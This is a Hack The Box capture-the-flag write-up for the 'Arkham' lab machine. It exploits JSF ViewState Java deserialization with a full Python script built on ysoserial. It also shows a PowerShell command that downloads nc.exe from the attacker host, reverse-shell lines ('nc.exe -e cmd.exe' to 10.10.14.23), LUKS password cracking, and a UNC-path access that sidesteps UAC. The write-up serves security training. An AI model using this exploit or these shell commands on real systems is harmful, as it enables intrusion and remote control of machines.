---
layout: single
title: Arkham - Hack The Box
excerpt: "Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted file partition, I created a Java deserialization payload using ysoserial to upload netcat and get a shell. After getting to user Batman with credentials found in a backup file, I was able to get access to the administrator directory by mounting the local c: drive via SMB instead of doing a proper UAC bypass."
date: 2019-08-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-arkham/arkham_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - java
  - deserialization
  - smb
  - luks
  - readpst
  - unintended
---

![](/assets/images/htb-writeup-arkham/arkham_logo.png)

Arkham was a medium difficulty box that shows how Java deserialization can be used by attackers to get remote code execution. After finding the JSF viewstates encryption key in a LUKS encrypted file partition, I created a Java deserialization payload using ysoserial to upload netcat and get a shell. After getting to user Batman with credentials found in a backup file, I was able to get access to the administrator directory by mounting the local c: drive via SMB instead of doing a proper UAC bypass.

## Summary

- There's an open SMB share where I find an `appserver.zip` file that contains a LUKS encrypted file partition
- After extracting the LUKS hash from the image file, I am able to crack it with hashcat
- I then mount the image and find the JSF app configuration files
- One of the file reveals the MAC secret for the JSF viewstates encryption
- I contruct an exploit that uses an already existing payload generator for JSF ViewStates and gain RCE
- I download netcat through powershell using the exploit then execute it to get a reverse shell
- The user `alfred` has a `backup.zip` file that contains an image with the `batman` user password
- I can get access as `batman` by using WinRM locally but I can't view the admin's directory because of UAC
- The unintended way to solve this one was to mount the local drive and read the system flag, therefore bypassing UAC

## Blog / Tools

- [https://articles.forensicfocus.com/2018/02/22/bruteforcing-linux-full-disk-encryption-luks-with-hashcat/](https://articles.forensicfocus.com/2018/02/22/bruteforcing-linux-full-disk-encryption-luks-with-hashcat/)
- [https://hackernoon.com/cracking-linux-full-disc-encryption-luks-with-hashcat-832d554310](https://hackernoon.com/cracking-linux-full-disc-encryption-luks-with-hashcat-832d554310)
- [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- [https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)

### Nmap

```
# nmap -sC -sV -p- 10.10.10.130
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-16 22:32 EDT
Nmap scan report for arkham.htb (10.10.10.130)
Host is up (0.0080s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mask Inc.
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web enum - IIS on port 80

I just get the standard default IIS web page when I go to port 80.

I didn't find anything when dirbusting it.

![](/assets/images/htb-writeup-arkham/port80.png)

### Web enum - Apache Tomcat on port 8080

The Apache Tomcat page is much more interesting, it's a company's front page with a subscription and contact form.

![](/assets/images/htb-writeup-arkham/port8080.png)

![](/assets/images/htb-writeup-arkham/subscribe.png)

Most of the links are not functional, but to make sure I didn't miss anything I spidered the website with Burp:

![](/assets/images/htb-writeup-arkham/spider.png)

The `userSubscribe.faces` file is the *Subscribe* link on the main page.

The `.faces` extension is used by JavaServer Faces

According to Wikipedia:

> JavaServer Faces (JSF) is a Java specification for building component-based user interfaces for web applications[1] and was formalized as a standard through the Java Community Process being part of the Java Platform, Enterprise Edition. It is also a MVC web framework that simplifies construction of user interfaces (UI) for server-based applications by using reusable UI components in a page.

I'll get back to that after the SMB enumeration, this is the way in.

### SMB enumeration

I'll use `smbmap` to quickly scan for accessible shares. I'm using an invalid username here so it connects as guest and not using a null session.
```
# smbmap -u snowscan -H 10.10.10.130
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.130...
[+] IP: 10.10.10.130:445	Name: arkham.htb
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	BatShare                                          	READ ONLY
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	Users                                             	READ ONLY
```

`BatShare` is accessible in read-only mode and there is a single file in there.

```
# smbmap -u snowscan -r BatShare -H 10.10.10.130
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.130...
[+] IP: 10.10.10.130:445	Name: arkham.htb
	Disk                                                  	Permissions
	----                                                  	-----------
	BatShare                                          	READ ONLY
	./
	dr--r--r--                0 Sun Feb  3 08:04:13 2019	.
	dr--r--r--                0 Sun Feb  3 08:04:13 2019	..
	fr--r--r--          4046695 Sun Feb  3 08:04:13 2019	appserver.zip
```

Downloading the file using `smbmap`:

```
# smbmap -u snowscan --download BatShare\\appserver.zip -H 10.10.10.130
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.130...
[+] Starting download: BatShare\appserver.zip (4046695 bytes)
[+] File output to: /usr/share/smbmap/10.10.10.130-BatShare_appserver.zip
```

Extracting and checking the content:

```
# 7z e 10.10.10.130-BatShare_appserver.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)

Scanning the drive for archives:
1 file, 4046695 bytes (3952 KiB)

Extracting archive: 10.10.10.130-BatShare_appserver.zip
--
Path = 10.10.10.130-BatShare_appserver.zip
Type = zip
Physical Size = 4046695

Everything is Ok

Files: 2
Size:       13631637
Compressed: 4046695
# ls -l
total 17268
-rw-r--r-- 1 root root  4046695 Mar 16 23:24 10.10.10.130-BatShare_appserver.zip
-rw-r--r-- 1 root root 13631488 Dec 25 01:05 backup.img
-rw-r--r-- 1 root root      149 Dec 25 01:21 IMPORTANT.txt
```

I check the `IMPORTANT.txt` message first and see that it contains a hint that the `backup.img` file is protected.

```
# cat IMPORTANT.txt
Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
```

I then check what kind of file this is and see that it is a LUKS encrypted file:

```
# file backup.img
backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
```

> The Linux Unified Key Setup (LUKS) is a disk encryption specification created by Clemens Fruhwirth in 2004 and originally intended for Linux.

### Cracking and looking inside LUKS container

I can extract the beginning of the partition containing the header so I can crack it with hashcat after:

```
# dd if=backup.img of=backup_header.dd bs=512 count=5000
5000+0 records in
5000+0 records out
2560000 bytes (2.6 MB, 2.4 MiB) copied, 0.0232298 s, 110 MB/s
```

Now I can crack it with hashcat:

```
C:\bin\hashcat>hashcat64 -m 14600 -a 0 -w 3 backup_header.dd passwords\rockyou.txt
hashcat (v5.1.0) starting...

[...]

backup_header.dd:batmanforever
```

The password is `batmanforever`

To mount the image I first open the image file and assign it to the device mapper, then mount it under `/mnt`:

```
# cryptsetup luksOpen backup.img backup
Enter passphrase for backup.img: [batmanforever]
# mount /dev/mapper/backup /mnt

root@ragingunicorn:/mnt/Mask# ls -lR
.:
total 880
drwxr-xr-x 2 root root   1024 Dec 25 00:22 docs
-rw-rw-r-- 1 root root  96978 Dec 25 00:18 joker.png
-rw-rw-r-- 1 root root 105374 Dec 25 00:20 me.jpg
-rw-rw-r-- 1 root root 687160 Dec 25 00:20 mycar.jpg
-rw-rw-r-- 1 root root   7586 Dec 25 00:19 robin.jpeg
drwxr-xr-x 2 root root   1024 Dec 25 00:24 tomcat-stuff

./docs:
total 196
-rw-r--r-- 1 root root 199998 Jun 15  2017 Batman-Begins.pdf

./tomcat-stuff:
total 191
-rw-r--r-- 1 root root   1368 Dec 25 00:23 context.xml
-rw-r--r-- 1 root root    832 Dec 25 00:24 faces-config.xml
-rw-r--r-- 1 root root   1172 Dec 25 00:23 jaspic-providers.xml
-rw-r--r-- 1 root root     39 Dec 25 00:24 MANIFEST.MF
-rw-r--r-- 1 root root   7678 Dec 25 00:23 server.xml
-rw-r--r-- 1 root root   2208 Dec 25 00:23 tomcat-users.xml
-rw-r--r-- 1 root root 174021 Dec 25 00:23 web.xml
-rw-r--r-- 1 root root   3498 Dec 25 00:24 web.xml.bak
```

So I have a bunch of files in there, I'll concentrate on the xml files.

In the `web.xml.bak` file, I find the encryption key for the ViewState. I can use this to construct my own serialized objects and pass them to the server to gain RCE.

```
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
    <context-param>
        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
<context-param>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
```

### Java Server Faces object deserialization exploit

I'll use `ysoserial` to generate the payload, then write some python to calculate the hmac based on the key provided in the `web.xml.bak` file.

```python
#!/usr/bin/python

from base64 import b64encode
from hashlib import sha1
from pwn import *
from requests import post, get

import hmac
import os
import pyDes
import sys

def main():
    if len(sys.argv) < 4:
        print("Java JSF exploit")
        print("Usage: {} <url> <cmd> <secret>\n".format(sys.argv[0]))
        sys.exit()

    url = sys.argv[1]
    cmd = sys.argv[2]
    secret = sys.argv[3]

    log.info("Payload provided: {}".format(cmd))
    cmd = "java -jar ./ysoserial.jar CommonsCollections6 \"{}\" > payload.bin".format(cmd)
    log.info("Generating the payload with: {}".format(cmd))
    os.system(cmd)

    log.info("Payload was written to payload.bin, reading it into variable...")
    with open("payload.bin", "rb") as f:
        payload = f.read()

    log.info("Length of payload: {} bytes".format(len(payload)))

    key = bytes(secret).decode("base64")
    des = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
    enc = des.encrypt(payload)
    b = hmac.new(key, bytes(enc), sha1).digest()
    payload = enc + b

    log.info("Sending encoded payload: {}".format(b64encode(payload)))
    data = {"javax.faces.ViewState": b64encode(payload)}
    r = post(url, data=data)
    log.success("Done!")

if __name__ == "__main__":
    main()
```

To get a reverse shell, I'll generate a payload that downloads netcat from my machine and store in it c:\programdata. I'm a fan of using netcat whenever possible for these types of challenges so I don't need to debug Powershell payloads, etc. It's certainly not stealthy or elegant but it's good enough for me here.

```
# python boom.py http://10.10.10.130:8080/userSubscribe.faces "powershell -command \\\"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \\programdata\\nc.exe\\\"" SnNGOTg3Ni0=
[*] Payload provided: powershell -command \"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \programdata\nc.exe\"
[*] Generating the payload with: java -jar ./ysoserial.jar CommonsCollections6 "powershell -command \"Invoke-WebRequest -Uri http://10.10.14.23/nc.exe -outfile \programdata\nc.exe\"" > payload.bin
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections6 (file:/root/htb/arkham/ysoserial.jar) to field java.util.HashSet.map
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections6
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
[*] Payload was written to payload.bin, reading it into variable...
[*] Length of payload: 1372 bytes
[*] Sending encoded payload: EpflyBhnLkAS/cI6nexhMqH/tMmK+e+oOSB+iGGStMf3iTfxuPA5PGNGhz6HO2nAZeudvUiuJvqiPb69whWbK2/EFMRkmhTDywwZ5O1KTeC46zdFOsXfLYOq+MjjY+tkAaxKM5Zb/
[...]
[+] Done!
```

The server retrieves the file from my VM:

```
# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.130 - - [17/Mar/2019 00:11:35] "GET /nc.exe HTTP/1.1" 200 -
```

Then I can execute netcat and get a shell:

```
# python boom.py http://10.10.10.130:8080/userSubscribe.faces "\\programdata\\nc.exe -e cmd.exe 10.10.14.23 4444" SnNGOTg3Ni0=
[*] Payload provided: \programdata\nc.exe -e cmd.exe 10.10.14.23 4444
[*] Generating the payload with: java -jar ./ysoserial.jar CommonsCollections6 "\programdata\nc.exe -e cmd.exe 10.10.14.23 4444" > payload.bin
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections6 (file:/root/htb/arkham/ysoserial.jar) to field java.util.HashSet.map
WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections6
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
[*] Payload was written to payload.bin, reading it into variable...
[*] Length of payload: 1320 bytes
[*] Sending encoded payload: EpflyBhnLkAS/cI6nexhMqH/tMmK+e+oOSB+iGGStMf3iTfxuPA5PGNGhz6HO2nAZeudvUiuJvqiPb69whWbK2/EFMRkmhTDywwZ5O1KTeC46zdFOsXfLYOq+MjjY+tkAaxKM5Zb/
[...]
[+] Done!
```

I get a shell and found `user.txt`:

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.130] 49686
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\tomcat\apache-tomcat-8.5.37\bin>whoami
arkham\alfred

C:\tomcat\apache-tomcat-8.5.37\bin>type c:\users\alfred\desktop\user.txt
ba6593...
```

### Elevate to user Batman

Checking local users, I find that batman is a member of local administrators so this is likely the next step.

```
C:\Users\Alfred>net users

User accounts for \\ARKHAM

-------------------------------------------------------------------------------
Administrator            Alfred                   Batman
DefaultAccount           Guest                    WDAGUtilityAccount
The command completed successfully.

C:\Users\Alfred>net users batman
[...]

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.
```

I find a backup file in Alfred's Downloads directory.

```
C:\Users\Alfred>dir /s downloads
 Volume in drive C has no label.
 Volume Serial Number is FA90-3873

 Directory of C:\Users\Alfred\downloads

02/03/2019  08:48 AM    <DIR>          .
02/03/2019  08:48 AM    <DIR>          ..
02/03/2019  08:41 AM    <DIR>          backups
               0 File(s)              0 bytes

 Directory of C:\Users\Alfred\downloads\backups

02/03/2019  08:41 AM    <DIR>          .
02/03/2019  08:41 AM    <DIR>          ..
02/03/2019  08:41 AM           124,257 backup.zip
               1 File(s)        124,257 bytes
```

I transferred the `backup.zip` file to my Kali box with netcat then checked its contents.

```
# 7z e backup.zip

# ls -l
total 33816
-rwx------ 1 root root 16818176 Feb  2 18:00 alfred@arkham.local.ost
```

This is an Outlook mailbox file and I can use `readpst` to read it instead of transferring it to my Windows VM.

```
# readpst -S alfred@arkham.local.ost
Opening PST file and indexes...
Processing Folder "Deleted Items"
Processing Folder "Inbox"
Processing Folder "Outbox"
Processing Folder "Sent Items"
Processing Folder "Calendar"
Processing Folder "Contacts"
Processing Folder "Conversation Action Settings"
Processing Folder "Drafts"
Processing Folder "Journal"
Processing Folder "Junk E-Mail"
Processing Folder "Notes"
Processing Folder "Tasks"
Processing Folder "Sync Issues"
	"Inbox" - 0 items done, 7 items skipped.
	"Calendar" - 0 items done, 3 items skipped.
Processing Folder "RSS Feeds"
Processing Folder "Quick Step Settings"
	"alfred@arkham.local.ost" - 15 items done, 0 items skipped.
Processing Folder "Conflicts"
Processing Folder "Local Failures"
Processing Folder "Server Failures"
	"Sync Issues" - 3 items done, 0 items skipped.
	"Drafts" - 1 items done, 0 items skipped.
```

I now have the email extracted and a PNG image attachment.

```
# ls -lR
.:
total 16
drwxr-xr-x 2 root root 4096 Mar 17 00:35  Calendar
drwxr-xr-x 2 root root 4096 Mar 17 00:35  Drafts
drwxr-xr-x 2 root root 4096 Mar 17 00:35  Inbox
drwxr-xr-x 2 root root 4096 Mar 17 00:35 'Sync Issues'

./Calendar:
total 0

./Drafts:
total 52
-rw-r--r-- 1 root root 37968 Mar 17 00:35 1
-rw-r--r-- 1 root root 10059 Mar 17 00:35 1-image001.png
```

The email contains a reference to Batman's password, which is in the attached image.

```
<p class=MsoNormal>Master Wayne stop forgetting your password<o:p></o:p></p>
```

The attachment contains a screenshot with Batman's password:

![](/assets/images/htb-writeup-arkham/batman.png)

Password: `Zx^#QZX+T!123`

Using WinRM I can start a powershell session as `batman`.

```
C:\Users\Alfred>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\Users\Alfred> $username = 'batman'
PS C:\Users\Alfred> $password = 'Zx^#QZX+T!123'
PS C:\Users\Alfred> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Users\Alfred> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\Users\Alfred> enter-pssession -computername arkham -credential $credential
[arkham]: PS C:\Users\Batman\Documents>
```

Something's wrong though, I can't change directories or see error messages:

```
[arkham]: PS C:\Users\Batman\Documents> cd ..
[arkham]: PS C:\Users\Batman\Documents> whoami
arkham\batman
[arkham]: PS C:\Users\Batman\Documents> cd \users\administrator\desktop
```

So what I did was spawn another netcat as `batman`

```
[arkham]: PS C:\Users\Batman\Documents> c:\programdata\nc.exe -e cmd.exe 10.10.14.23 6666

# nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.130] 49695
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Batman\Documents>whoami
arkham\batman
```

### Unintended way to get access to the Administrator user directory

I can't get to the Administrator directory because UAC is enabled.

With Powershell I can check the status of UAC and see that it is enabled:

```
PS C:\Users\Batman\Documents> (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
1
```

For some reason, if I use UNC paths I can access to the administrator directory... So this is probably unintended by the box creator but it does get me the flag :)

```
C:\Users\Batman\Documents>pushd \\10.10.10.130\c$

Z:\>cd \users\administrator\desktop

Z:\Users\Administrator\Desktop>dir
 Volume in drive Z has no label.
 Volume Serial Number is FA90-3873

 Directory of Z:\Users\Administrator\Desktop

02/03/2019  09:32 AM    <DIR>          .
02/03/2019  09:32 AM    <DIR>          ..
02/03/2019  09:32 AM                70 root.txt
               1 File(s)             70 bytes
               2 Dir(s)   8,710,045,696 bytes free

Z:\Users\Administrator\Desktop>type root.txt
type root.txt
636783...
```
